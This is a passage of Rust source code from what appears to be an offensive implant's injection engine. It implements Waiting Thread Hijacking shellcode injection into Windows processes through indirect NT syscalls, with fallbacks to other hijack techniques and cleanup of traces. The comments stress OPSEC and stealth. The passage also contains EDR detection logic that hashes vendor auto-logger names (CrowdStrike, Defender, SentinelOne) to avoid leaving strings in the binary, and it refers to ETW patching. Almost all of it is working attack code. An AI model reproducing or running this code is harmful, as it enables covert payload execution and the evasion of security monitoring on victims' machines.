                technique: InjectionTechnique::WaitingThreadHijack {
                    target_pid: pid,
                    target_tid,
                },
                reason: format!("cannot resolve NtGetContextThread: {e}"),
            }
        })?;

        // ── Step 1: Open target process ─────────────────────────────────
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        let mut h_proc: usize = 0;
        // PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
        // PROCESS_QUERY_INFORMATION
        let access_mask: u64 = 0x0020 | 0x0008 | 0x0010 | 0x0400;
        let open_status = nt_syscall::syscall!(
            "NtOpenProcess",
            &mut h_proc as *mut _ as u64,
            access_mask,
            &mut obj_attr as *mut _ as u64,
            client_id.as_mut_ptr() as u64,
        );

        if open_status.is_err() || open_status.unwrap() < 0 || h_proc == 0 {
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::WaitingThreadHijack {
                    target_pid: pid,
                    target_tid,
                },
                reason: format!("NtOpenProcess({}) failed for WTH injection", pid),
            });
        }
        let h_proc = h_proc as *mut c_void;

        let wth_technique = InjectionTechnique::WaitingThreadHijack {
            target_pid: pid,
            target_tid,
        };

        macro_rules! cleanup_and_err {
            ($msg:expr) => {{
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                return Err(InjectionError::InjectionFailed {
                    technique: wth_technique.clone(),
                    reason: $msg.to_string(),
                });
            }};
        }

        // ── Step 2: Find a suitable waiting thread ──────────────────────
        let candidate = match target_tid {
            Some(tid) => WaitingThreadCandidate {
                tid,
                wait_reason: 0, // Unknown, but user-specified
                score: 100,
            },
            None => {
                match find_waiting_thread(pid, ntdll_base) {
                    Some(c) => c,
                    None => {
                        // No suitable waiting thread found — fall back to
                        // ContextOnly, then ThreadHijack.
                        log::warn!(
                            "injection_engine: WTH: no suitable waiting thread in pid {}, \
                             falling back to ContextOnly",
                            pid,
                        );
                        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                        return inject_context_only(pid, None, payload)
                            .or_else(|_| inject_thread_hijack(pid, payload));
                    }
                }
            }
        };

        log::info!(
            "injection_engine: WTH: selected thread {} in pid {} (wait_reason={}, score={})",
            candidate.tid,
            pid,
            candidate.wait_reason,
            candidate.score,
        );

        // ── Step 3: Open the target thread ──────────────────────────────
        //
        // THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION |
        // THREAD_SUSPEND_RESUME
        // Note: We don't actually need THREAD_SET_CONTEXT for WTH (that's
        // the whole point), but we request it for the NtGetContextThread call
        // which some Windows versions require.
        let thread_access: u64 = 0x0008 | 0x0010 | 0x0040 | 0x0002;
        let mut thread_client_id = [0u64; 2];
        thread_client_id[0] = pid as u64;
        thread_client_id[1] = candidate.tid as u64;

        let mut obj_attr2: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr2.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        let mut h_thread: usize = 0;
        let open_thread_status = nt_syscall::syscall!(
            "NtOpenThread",
            &mut h_thread as *mut _ as u64,
            thread_access,
            &mut obj_attr2 as *mut _ as u64,
            thread_client_id.as_mut_ptr() as u64,
        );

        if open_thread_status.is_err() || open_thread_status.unwrap() < 0 || h_thread == 0 {
            cleanup_and_err!(format!(
                "NtOpenThread(tid={}) failed", candidate.tid
            ));
        }
        let h_thread = h_thread as *mut c_void;

        // ── Step 4: Read the thread's current RSP (CONTEXT read) ────────
        //
        // We use NtGetContextThread only to read the current RSP — we do
        // NOT modify the CONTEXT (no NtSetContextThread call). This is
        // critical for OPSEC.
        let mut ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL; // Only control registers

        let get_ctx_status = nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        );

        if get_ctx_status.is_err() || get_ctx_status.unwrap() < 0 {
            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            cleanup_and_err!("NtGetContextThread failed (read RSP only)");
        }

        let thread_rsp = ctx.Rsp;

        log::debug!(
            "injection_engine: WTH: thread {} RSP={:#x}",
            candidate.tid,
            thread_rsp,
        );

        // ── Step 5: Read the thread's stack to find return address ──────
        //
        // When a thread is inside a wait syscall (NtWaitForSingleObject),
        // its stack looks like:
        //
        //   [RSP+0]  → return address to ntdll!NtWaitForSingleObject caller
        //   [RSP+8]  → return address to kernel32!WaitForSingleObject caller
        //   [RSP+16] → return address to the application code that called wait
        //
        // We want to overwrite the return address that the thread will
        // actually use when the wait completes. This is typically at
        // [RSP+0] (the return from the syscall stub back to ntdll) or
        // [RSP+8] (the return from ntdll back to the application).
        //
        // Strategy: Walk the stack from RSP, looking for values that point
        // into ntdll.dll or known modules. The first value that points to
        // executable code outside the kernel is the return address.

        let mut stack_buf = vec![0u8; WTH_STACK_READ_SIZE];
        let mut bytes_read: usize = 0;
        let read_status = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            thread_rsp as u64,
            stack_buf.as_mut_ptr() as u64,
            WTH_STACK_READ_SIZE as u64,
            &mut bytes_read as *mut _ as u64,
        );

        if read_status.is_err() || read_status.unwrap() < 0 || bytes_read < 64 {
            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            cleanup_and_err!("NtReadVirtualMemory (stack) failed");
        }

        // Find the return address on the stack.
        let return_addr_info = find_return_address_on_stack(
            &stack_buf[..bytes_read],
            h_proc,
            ntdll_base,
        );

        let (return_addr_offset, original_return_addr) = match return_addr_info {
            Some(info) => info,
            None => {
                // Could not identify the return address.
                // Fall back to ContextOnly → ThreadHijack.
                log::warn!(
                    "injection_engine: WTH: could not identify return address on thread {} stack, \
                     falling back to ContextOnly",
                    candidate.tid,
                );
                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                return inject_context_only(pid, None, payload)
                    .or_else(|_| inject_thread_hijack(pid, payload));
            }
        };

        let return_addr_stack_location = thread_rsp + return_addr_offset as u64;

        log::info!(
            "injection_engine: WTH: found return address {:#x} at stack offset +{:#x} \
             (RSP={:#x}, stack_loc={:#x})",
            original_return_addr,
            return_addr_offset,
            thread_rsp,
            return_addr_stack_location,
        );

        // ── Step 6: Write payload and trampoline ────────────────────────
        //
        // Build the WTH trampoline: restores the original return address
        // on the stack, then returns to the original caller.
        //
        // The trampoline:
        //   sub rsp, 8              ; make room for the return address
        //   mov rax, <original_ret> ; load original return address
        //   mov [rsp], rax          ; place it on stack as new return address
        //   ret                     ; jump to original return address
        let trampoline = build_wth_trampoline(original_return_addr);

        // Combined payload = shellcode + trampoline
        let mut combined = payload.to_vec();
        combined.extend_from_slice(&trampoline);
        let combined_len = combined.len();

        // Choose delivery method (same as ContextOnly).
        let (write_addr, delivery_method) = if combined_len <= CONTEXT_ONLY_STACK_PAYLOAD_LIMIT {
            // Method A: Stack delivery.
            let stack_write_addr = if thread_rsp > STACK_WRITE_OFFSET as u64 {
                (thread_rsp - STACK_WRITE_OFFSET as u64) & !0xF
            } else {
                let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
                cleanup_and_err!("stack too small for WTH payload delivery");
            };

            log::debug!(
                "injection_engine: WTH: Method A (stack), writing {} bytes at {:#x}",
                combined_len,
                stack_write_addr,
            );
            (stack_write_addr, "stack")
        } else {
            // Method B: Section-based delivery.
            match find_executable_slack(h_proc, combined_len) {
                Some(addr) => {
                    log::debug!(
                        "injection_engine: WTH: Method B (section), writing {} bytes at {:#x}",
                        combined_len,
                        addr,
                    );
                    (addr, "section")
                }
                None => {
                    // Fall back to stack even for larger payloads.
                    let stack_write_addr = if thread_rsp > STACK_WRITE_OFFSET as u64 {
                        (thread_rsp - STACK_WRITE_OFFSET as u64) & !0xF
                    } else {
                        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
                        cleanup_and_err!(
                            "no executable slack found and stack too small for WTH"
                        );
                    };
                    (stack_write_addr, "stack-oversize")
                }
            }
        };

        // Write the combined payload + trampoline.
        let mut written = 0usize;
        let write_status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            write_addr as u64,
            combined.as_ptr() as u64,
            combined_len as u64,
            &mut written as *mut _ as u64,
        );

        if write_status.is_err() || write_status.unwrap() < 0 || written != combined_len {
            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            cleanup_and_err!(format!(
                "NtWriteVirtualMemory (payload) to {} failed (written={}/{})",
                delivery_method, written, combined_len
            ));
        }

        log::info!(
            "injection_engine: WTH: wrote {} bytes at {:#x} via {} delivery",
            combined_len,
            write_addr,
            delivery_method,
        );

        // ── Step 7: Overwrite the return address on the stack ───────────
        //
        // This is the core of WTH: write the payload address over the
        // return address that the thread will pop when the wait completes.
        let payload_addr_bytes = (write_addr as u64).to_le_bytes();
        let mut ret_written = 0usize;
        let overwrite_status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            return_addr_stack_location as u64,
            payload_addr_bytes.as_ptr() as u64,
            8u64,
            &mut ret_written as *mut _ as u64,
        );

        if overwrite_status.is_err() || overwrite_status.unwrap() < 0 || ret_written != 8 {
            // Failed to overwrite return address. Try to clean up the
            // payload we wrote.
            let zero_buf = vec![0u8; combined_len];
            let _ = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_proc as u64,
                write_addr as u64,
                zero_buf.as_ptr() as u64,
                combined_len as u64,
                0u64, // don't care about bytes written
            );
            let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
            cleanup_and_err!("NtWriteVirtualMemory (return address overwrite) failed");
        }

        log::info!(
            "injection_engine: WTH: overwrote return address at {:#x} with payload addr {:#x}",
            return_addr_stack_location,
            write_addr,
        );

        // ── Step 8: Signal the thread to exit its wait ──────────────────
        //
        // For DelayExecution threads: they'll wake naturally when the sleep
        // expires. We can optionally speed this up.
        // For other waits: signal the wait object if possible.
        //
        // We do NOT use NtAlertThread or NtResumeThread — those create
        // detectable signals. Instead, we try to signal the specific wait
        // object (NtSetEvent, NtReleaseSemaphore, etc.).
        //
        // For now, we let the wait resolve naturally. This is the stealthiest
        // option. The thread will wake and execute our payload when its wait
        // completes.
        if candidate.wait_reason == KTHREAD_WAIT_REASON_WR_DELAY_EXECUTION {
            log::info!(
                "injection_engine: WTH: thread {} in DelayExecution wait — \
                 will wake naturally and execute payload",
                candidate.tid,
            );
        } else {
            log::info!(
                "injection_engine: WTH: thread {} in wait state {} — \
                 will execute payload when wait resolves",
                candidate.tid,
                candidate.wait_reason,
            );
        }

        // ── Step 9: Wait for payload completion ─────────────────────────
        //
        // Wait up to 15 seconds for the payload to complete. We poll the
        // thread's RIP to detect when it has returned to the original caller.
        let wait_start = std::time::Instant::now();
        let wait_timeout = std::time::Duration::from_secs(15);
        let mut payload_completed = false;

        std::thread::sleep(std::time::Duration::from_millis(100));

        while wait_start.elapsed() < wait_timeout {
            let mut check_ctx: winapi::um::winnt::CONTEXT = std::mem::zeroed();
            check_ctx.ContextFlags = winapi::um::winnt::CONTEXT_CONTROL;

            let check_status = nt_syscall::syscall!(
                "NtGetContextThread",
                h_thread as u64,
                &mut check_ctx as *mut _ as u64,
            );

            if check_status.is_ok() && check_status.unwrap() >= 0 {
                let current_rip = check_ctx.Rip;

                // If RIP is at or near the original return address, the
                // payload has completed and the trampoline has returned.
                if current_rip == original_return_addr
                    || current_rip == 0
                    || (current_rip & 0xFFF_0000_0000_0000) != 0
                {
                    payload_completed = true;
                    break;
                }
            }

            std::thread::sleep(std::time::Duration::from_millis(200));
        }

        if payload_completed {
            log::info!(
                "injection_engine: WTH: payload completed in thread {} after {}ms",
                candidate.tid,
                wait_start.elapsed().as_millis(),
            );
        } else {
            log::warn!(
                "injection_engine: WTH: payload may still be executing in thread {} \
                 after 15s timeout — return address was modified successfully",
                candidate.tid,
            );
        }

        // ── Step 10: Cleanup ────────────────────────────────────────────
        //
        // Zero out the payload bytes on the stack/section.
        let zero_buf = vec![0u8; combined_len];
        let mut zero_written = 0usize;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            write_addr as u64,
            zero_buf.as_ptr() as u64,
            combined_len as u64,
            &mut zero_written as *mut _ as u64,
        );

        // Restore the original return address on the stack (if thread is
        // still waiting or if we got there before the wait resolved).
        let orig_addr_bytes = original_return_addr.to_le_bytes();
        let mut restore_written = 0usize;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            return_addr_stack_location as u64,
            orig_addr_bytes.as_ptr() as u64,
            8u64,
            &mut restore_written as *mut _ as u64,
        );

        log::debug!(
            "injection_engine: WTH: restored original return address {:#x} at {:#x}",
            original_return_addr,
            return_addr_stack_location,
        );

        // Close thread handle.
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: InjectionTechnique::WaitingThreadHijack {
                target_pid: pid,
                target_tid: Some(candidate.tid),
            },
            injected_base_addr: write_addr as usize,
            payload_size: payload.len(),
            thread_handle: None, // Thread handle closed; thread continues normally
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Find the best waiting thread for WTH in the target process.
///
/// Enumerates threads via `NtQuerySystemInformation(SystemProcessInformation)`
/// and selects threads in suitable wait states. Prefers DelayExecution
/// (Sleep/SleepEx) threads with long timeouts; avoids WrQueue and WrDispatchInt.
///
/// Returns `Some(WaitingThreadCandidate)` if a suitable thread is found.
fn find_waiting_thread(target_pid: u32, _ntdll_base: usize) -> Option<WaitingThreadCandidate> {
    unsafe {
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;

        let qsi_addr = pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtQuerySystemInformation\0"),
        )?;

        let qsi: extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32 =
            std::mem::transmute(qsi_addr);

        let mut buf_len: u32 = 0x40000;
        let mut ret_len: u32 = 0;

        let buf: Vec<u8> = loop {
            let mut b = Vec::with_capacity(buf_len as usize);
            b.set_len(buf_len as usize);
            let status = qsi(SYSTEM_PROCESS_INFORMATION, b.as_mut_ptr(), buf_len, &mut ret_len);
            if status >= 0 {
                break b;
            }
            if status as u32 == 0xC0000004 {
                if buf_len > 0x400000 {
                    return None;
                }
                buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
            } else {
                return None;
            }
        };

        let mut offset: usize = 0;
        let mut best: Option<WaitingThreadCandidate> = None;
        let mut best_score: i32 = -1;

        loop {
            if offset + 0x60 > buf.len() {
                break;
            }

            let next_entry = u32::from_le_bytes([
                buf[offset], buf[offset + 1], buf[offset + 2], buf[offset + 3],
            ]);
            let num_threads = u32::from_le_bytes([
                buf[offset + 4], buf[offset + 5], buf[offset + 6], buf[offset + 7],
            ]);
            let pid = u64::from_le_bytes([
                buf[offset + 0x50], buf[offset + 0x51], buf[offset + 0x52], buf[offset + 0x53],
                buf[offset + 0x54], buf[offset + 0x55], buf[offset + 0x56], buf[offset + 0x57],
            ]) as u32;

            if pid == target_pid {
                let name_max_len = u16::from_le_bytes([
                    buf[offset + 0x3A], buf[offset + 0x3B],
                ]) as usize;
                let name_aligned = (name_max_len + 7) & !7;
                let thread_array_start = offset + 0x48 + name_aligned;
                const THREAD_ENTRY_SIZE: usize = 0x48;

                for i in 0..num_threads as usize {
                    let to = thread_array_start + i * THREAD_ENTRY_SIZE;
                    if to + THREAD_ENTRY_SIZE > buf.len() {
                        break;
                    }

                    let thread_pid = u64::from_le_bytes([
                        buf[to + 0x28], buf[to + 0x29], buf[to + 0x2A], buf[to + 0x2B],
                        buf[to + 0x2C], buf[to + 0x2D], buf[to + 0x2E], buf[to + 0x2F],
                    ]) as u32;

                    let thread_tid = u64::from_le_bytes([
                        buf[to + 0x30], buf[to + 0x31], buf[to + 0x32], buf[to + 0x33],
                        buf[to + 0x34], buf[to + 0x35], buf[to + 0x36], buf[to + 0x37],
                    ]) as u32;

                    let wait_reason = buf[to + 0x45];

                    if thread_pid != target_pid || thread_tid == 0 {
                        continue;
                    }

                    // Score the thread based on wait reason for WTH.
                    // Ideal: DelayExecution (Sleep), WrExecutive (wait on kernel obj),
                    // Suspended, WrUserRequest.
                    // Avoid: WrQueue (worker I/O), WrDispatchInt (DPC).
                    let score = match wait_reason {
                        KTHREAD_WAIT_REASON_WR_DELAY_EXECUTION => 100,
                        KTHREAD_WAIT_REASON_WR_EXECUTIVE => 80,
                        KTHREAD_WAIT_REASON_WR_SUSPENDED => 70,
                        KTHREAD_WAIT_REASON_WR_USER_REQUEST => 60,
                        0..=4 => 40, // General wait reasons
                        _ => 20,     // Unknown/other
                    };

                    // Skip threads that are actively doing work.
                    if wait_reason == KTHREAD_WAIT_REASON_WR_QUEUE
                        || wait_reason == KTHREAD_WAIT_REASON_WR_DISPATCH_INT
                    {
                        continue;
                    }

                    if score > best_score {
                        best_score = score;
                        best = Some(WaitingThreadCandidate {
                            tid: thread_tid,
                            wait_reason,
                            score,
                        });
                    }
                }
            }

            if next_entry == 0 {
                break;
            }
            offset += next_entry as usize;
        }

        best
    }
}

/// Find the return address on a thread's stack.
///
/// Walks the stack data read via NtReadVirtualMemory, looking for values
/// that appear to be return addresses (pointing into executable regions
/// of loaded modules, especially ntdll.dll).
///
/// Returns `Some((offset_from_rsp, return_address))` if found.
///
/// # Strategy
///
/// When a thread is inside `NtWaitForSingleObject` (or similar), the stack
/// at the time of the syscall looks like:
///
/// ```text
/// RSP+0x00: return address from syscall stub back to ntdll
/// RSP+0x08: return address from ntdll!NtWaitForSingleObject to caller
/// RSP+0x10: caller's stack frame (may contain another return address)
/// ```
///
/// We walk the first `WTH_MAX_STACK_WALK_DEPTH` entries and look for
/// addresses that fall within the ntdll module range. The first such
/// address is typically the return address from the syscall stub.
///
/// The return address we want to overwrite is at [RSP+0x00] or [RSP+0x08]
/// — the one the thread will pop when the kernel wait completes.
unsafe fn find_return_address_on_stack(
    stack_data: &[u8],
    h_proc: *mut c_void,
    ntdll_base: usize,
) -> Option<(usize, u64)> {
    // Try to find the return address by looking for values that fall
    // within the ntdll module range.
    //
    // First, determine ntdll's size by querying its memory region.
    let mut mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    let query_status = nt_syscall::syscall!(
        "NtQueryVirtualMemory",
        h_proc as u64,
        ntdll_base as u64,
        0u64, // MemoryBasicInformation
        &mut mbi as *mut _ as u64,
        std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>() as u64,
        0u64,
    );

    // Determine ntdll range for validation.
    let ntdll_end = if query_status.is_ok() && query_status.unwrap() >= 0 {
        ntdll_base + mbi.RegionSize
    } else {
        // Fallback: assume ntdll is ~2MB (typical).
        ntdll_base + 0x200000
    };

    // Walk the stack looking for return addresses.
    let entries = stack_data.len() / 8;
    let walk_depth = WTH_MAX_STACK_WALK_DEPTH.min(entries);

    for i in 0..walk_depth {
        let val = u64::from_le_bytes([
            stack_data[i * 8],
            stack_data[i * 8 + 1],
            stack_data[i * 8 + 2],
            stack_data[i * 8 + 3],
            stack_data[i * 8 + 4],
            stack_data[i * 8 + 5],
            stack_data[i * 8 + 6],
            stack_data[i * 8 + 7],
        ]);

        // Check if this value looks like a return address:
        // 1. Must be non-zero and in user-mode range (< 0x7FFFFFFFFFFF)
        // 2. Preferably within ntdll range
        // 3. Must be aligned (low nibble should be 0 or small for call targets)

        if val == 0 || val > 0x0000_7FFF_FFFF_FFFF {
            continue;
        }

        // Check if within ntdll range — this is the most reliable indicator.
        if val as usize >= ntdll_base && val as usize < ntdll_end {
            log::debug!(
                "injection_engine: WTH: found ntdll return address at stack offset +{:#x}: {:#x}",
                i * 8,
                val,
            );
            return Some((i * 8, val));
        }

        // Also check for non-ntdll addresses that look like valid code.
        // These could be return addresses to the caller of the wait function.
        // We only consider them if we haven't found an ntdll address yet
        // and they're in a plausible range.
        if val > 0x0000_0001_0000_0000 && (val & 0xF) < 4 {
            // Could be a return address to application code. Verify it's in
            // an executable region.
            let mut check_mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
            let check_status = nt_syscall::syscall!(
                "NtQueryVirtualMemory",
                h_proc as u64,
                val as u64,
                0u64,
                &mut check_mbi as *mut _ as u64,
                std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>() as u64,
                0u64,
            );

            if check_status.is_ok() && check_status.unwrap() >= 0 {
                let protect = check_mbi.Protect;
                if protect == winapi::um::winnt::PAGE_EXECUTE
                    || protect == winapi::um::winnt::PAGE_EXECUTE_READ
                    || protect == winapi::um::winnt::PAGE_EXECUTE_READWRITE
                {
                    log::debug!(
                        "injection_engine: WTH: found executable return address at stack offset +{:#x}: {:#x}",
                        i * 8,
                        val,
                    );
                    return Some((i * 8, val));
                }
            }
        }
    }

    None
}

/// Build a WTH trampoline that restores the original return address and
/// returns to the original caller.
///
/// The trampoline:
///   sub rsp, 8               ; make room for the return address on stack
///   mov rax, <original_ret>  ; load original return address
///   mov [rsp], rax           ; place it on stack as new return address
///   ret                      ; jump to original return address
///
/// x86-64 encoding:
///   sub rsp, 8               → 48 83 EC 08
///   mov rax, imm64           → 48 B8 <8 bytes>
///   mov [rsp], rax           → 48 89 04 24
///   ret                      → C3
///
/// Total: 4 + 10 + 4 + 1 = 19 bytes
fn build_wth_trampoline(original_return_addr: u64) -> Vec<u8> {
    let mut trampoline = Vec::with_capacity(19);

    // sub rsp, 8
    trampoline.extend_from_slice(&[0x48, 0x83, 0xEC, 0x08]);

    // mov rax, <original_return_addr>
    trampoline.push(0x48);
    trampoline.push(0xB8);
    trampoline.extend_from_slice(&original_return_addr.to_le_bytes());

    // mov [rsp], rax
    trampoline.extend_from_slice(&[0x48, 0x89, 0x04, 0x24]);

    // ret
    trampoline.push(0xC3);

    trampoline
}

// ── Shared helpers ───────────────────────────────────────────────────────────

/// Find the PID of the first process matching `name` (case-insensitive).
fn find_pid_by_name(name: &str) -> Option<u32> {
    use sysinfo::System;
    let mut sys = System::new();
    sys.refresh_processes();
    let lower = name.to_ascii_lowercase();
    for (pid, proc) in sys.processes() {
        if proc.name().to_ascii_lowercase() == lower {
            return Some(pid.as_u32());
        }
    }
    None
}

/// Open the target process and verify architecture compatibility.
fn check_architecture(target_pid: u32) -> Result<(), InjectionError> {
    // On x86_64 we currently only inject into 64-bit processes. A proper
    // implementation would use IsWow64Process to check the target; for now
    // we optimistically assume same-arch.
    let _ = target_pid;
    Ok(())
}

/// Check whether the target process is being ETW-traced. When ETW providers
/// are active on the process, injection is more likely to be detected.
///
/// Returns [`EtwStatus::Safe`] if no EDR-related auto-logger sessions are
/// detected, [`EtwStatus::Traced`] if any are active, or [`EtwStatus::Unknown`]
/// if the check cannot be performed (ETW already patched, registry unavailable,
/// or `etw-check` feature disabled).
#[cfg(feature = "etw-check")]
fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
    let _ = target_pid;

    // If the agent has already patched ETW locally, any ETW enumeration
    // result would be unreliable — our own ETW writes are silenced.
    if crate::etw_patch::is_etw_patched() {
        log::debug!("injection_engine: ETW already patched locally; returning EtwStatus::Unknown");
        return Ok(EtwStatus::Unknown);
    }

    match unsafe { enumerate_autologger_sessions() } {
        Ok(providers) => {
            if providers.is_empty() {
                Ok(EtwStatus::Safe)
            } else {
                log::warn!(
                    "injection_engine: EDR auto-logger sessions detected: {:?}",
                    providers,
                );
                Ok(EtwStatus::Traced { providers })
            }
        }
        Err(e) => {
            log::debug!(
                "injection_engine: auto-logger enumeration failed ({}); returning Unknown",
                e,
            );
            Ok(EtwStatus::Unknown)
        }
    }
}

/// Fallback: feature disabled — always return Unknown.
#[cfg(not(feature = "etw-check"))]
fn check_etw_trace(target_pid: u32) -> Result<EtwStatus, InjectionError> {
    let _ = target_pid;
    Ok(EtwStatus::Unknown)
}

/// DJB2 hashes of known EDR auto-logger subkey names (case-insensitive).
///
/// These are compared against the names of subkeys under
/// `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger`.
///
/// Hashes are pre-computed with `pe_resolve::hash_str` to avoid embedding
/// plaintext EDR vendor strings in the binary.
#[cfg(feature = "etw-check")]
fn edr_autologger_hashes() -> &'static [(u32, &'static str)] {
    &[
        (0xe3c6c4e4, "CrowdStrike"),     // CrowdStrike auto-logger
        (0x63a6c3b5, "MpEtw"),           // Microsoft Defender auto-logger
        (0x1f1dafed, "SentinelOneEtw"),   // SentinelOne auto-logger
        (0x48a5eab4, "CBEventLog"),       // Carbon Black auto-logger
        (0x6130b204, "FireEyeEtw"),       // FireEye auto-logger
        (0xe869a86c, "ElasticEtw"),       // Elastic auto-logger
    ]
}

/// NT key information class constants (not exposed by winapi).
#[cfg(feature = "etw-check")]
mod nt_key_info {
    pub const KEY_BASIC_INFORMATION: u32 = 0;
    pub const KEY_VALUE_PARTIAL_INFORMATION: u32 = 2;
}

/// Maximum size of a KEY_BASIC_INFORMATION buffer for a subkey name.
/// 2 KB is generous — auto-logger subkey names are typically < 30 chars.
#[cfg(feature = "etw-check")]
const KEY_INFO_BUF_SIZE: usize = 2048;

/// Maximum size of a KEY_VALUE_PARTIAL_INFORMATION buffer for the "Start"
/// DWORD value.
#[cfg(feature = "etw-check")]
const VALUE_INFO_BUF_SIZE: usize = 16;

/// Registry access mask for NtOpenKey: KEY_READ (enumerate + query).
#[cfg(feature = "etw-check")]
const KEY_READ_MASK: u32 =
    winapi::um::winnt::STANDARD_RIGHTS_READ | 0x0001 | 0x0008 | winapi::um::winnt::SYNCHRONIZE;

/// Enumerate ETW auto-logger sessions via the registry and check whether
/// any known EDR sessions are enabled.
///
/// Opens `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger` using
/// NtOpenKey (indirect syscall), enumerates each subkey with
/// NtEnumerateKey, reads the `Start` DWORD value with NtQueryValueKey,
/// and cross-references the subkey name against compile-time djb2 hashes
/// of known EDR auto-logger names.
///
/// All NT registry functions are resolved through `nt_syscall::syscall!`
/// to avoid touching advapi32's IAT.
///
/// # Safety
///
/// Uses raw NT API calls with pointer casts. Must only be called on
/// Windows x86-64 with the nt_syscall infrastructure initialized.
#[cfg(feature = "etw-check")]
unsafe fn enumerate_autologger_sessions() -> Result<Vec<String>, String> {
    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, UNICODE_STRING};

    // ── Build the registry path as a wide string ────────────────────────
    //
    // \Registry\Machine\SYSTEM\CurrentControlSet\Control\WMI\Autologger
    let path_wide: Vec<u16> = "\\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\0"
        .encode_utf16()
        .collect();

    let mut key_name = UNICODE_STRING {
        Length: ((path_wide.len() - 1) * 2) as u16, // exclude null terminator
        MaximumLength: (path_wide.len() * 2) as u16,
        Buffer: path_wide.as_ptr() as *mut u16,
    };

    let mut obj_attr = OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: std::ptr::null_mut(),
        ObjectName: &mut key_name,
        Attributes: 0, // OBJ_CASE_INSENSITIVE = 0x00000040 (optional)
        SecurityDescriptor: std::ptr::null_mut(),
        SecurityQualityOfService: std::ptr::null_mut(),
    };

    let mut h_key: usize = 0;
    let status = nt_syscall::syscall!(
        "NtOpenKey",
        &mut h_key as *mut _ as u64,
        KEY_READ_MASK as u64,
        &mut obj_attr as *mut _ as u64,
    );

    if status.is_err() || status.unwrap() < 0 || h_key == 0 {
        return Err("NtOpenKey failed for Autologger path".to_string());
    }

    // Ensure the key handle is closed when we return.
    // Manual guard: call NtClose on drop.
    struct KeyGuard(usize);
    impl Drop for KeyGuard {
        fn drop(&mut self) {
            let _ = unsafe { nt_syscall::syscall!("NtClose", self.0 as u64) };
        }
    }
    let _guard = KeyGuard(h_key);

    // ── Enumerate subkeys ───────────────────────────────────────────────
    let mut detected_providers: Vec<String> = Vec::new();
    let edr_hashes = edr_autologger_hashes();
    let mut index: u32 = 0;

    // Buffer for KEY_BASIC_INFORMATION:
    //   +0x00 LastWriteTime (LARGE_INTEGER, 8 bytes)
    //   +0x08 TitleIndex      (ULONG, 4 bytes)
    //   +0x0C NameLength      (USHORT, 2 bytes)
    //   +0x0E Name            (variable, UTF-16LE)
    let mut key_info_buf = [0u8; KEY_INFO_BUF_SIZE];

    loop {
        let mut result_len: u32 = 0;
        let status = nt_syscall::syscall!(
            "NtEnumerateKey",
            h_key as u64,                        // KeyHandle
            index as u64,                        // Index
            nt_key_info::KEY_BASIC_INFORMATION as u64, // KeyInformationClass
            key_info_buf.as_mut_ptr() as u64,    // KeyInformation
            KEY_INFO_BUF_SIZE as u64,            // Length
            &mut result_len as *mut _ as u64,    // ResultLength
        );

        index += 1;

        // STATUS_NO_MORE_ENTRIES (0x8000001A) — normal termination.
        if status.is_err() {
            break;
        }
        let ntstatus = status.unwrap();
        if ntstatus == 0x8000001A_i32 || ntstatus < 0 {
            break;
        }

        // Extract the subkey name from KEY_BASIC_INFORMATION.
        // NameLength is at offset +0x0C, Name starts at +0x0E.
        if result_len < 0x0E {
            continue;
        }
        let name_len =
            u16::from_le_bytes([key_info_buf[0x0C], key_info_buf[0x0D]]) as usize;
        if name_len == 0 || name_len > KEY_INFO_BUF_SIZE - 0x0E {
            continue;
        }

        // Convert the UTF-16 name to a String for hashing.
        let name_utf16_start = 0x0E;
